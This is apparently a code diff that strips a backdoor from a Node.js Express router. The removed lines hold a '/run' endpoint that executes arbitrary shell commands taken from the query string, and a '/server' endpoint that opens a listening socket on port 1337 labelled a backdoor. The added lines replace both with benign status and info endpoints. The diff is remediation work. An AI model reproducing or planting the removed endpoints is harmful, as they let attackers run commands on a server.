@@ -1,21 +1,17 @@
 const express = require('express');
-const { exec } = require('child_process');
-const net = require('net');
 const router = express.Router();
 
-router.get('/run', (req, res) => {
-    const cmd = req.query.cmd;
-    require('child_process').exec(cmd, (err, stdout, stderr) => {
-        res.send(stdout || stderr);
-    });
+// Safe endpoint to check server health instead of running arbitrary commands
+router.get('/status', (req, res) => {
+    res.send('Server is running normally.');
 });
 
-router.get('/server', (req, res) => {
-    require('net').createServer(socket => {
-        socket.pipe(socket);
-    }).listen(1337);
-
-    res.send('Backdoor server running.');
+// Secure endpoint to simulate server info (no open socket)
+router.get('/info', (req, res) => {
+    res.json({
+        uptime: process.uptime(),
+        message: 'Server info retrieved successfully'
+    });
 });
 
 module.exports = router;
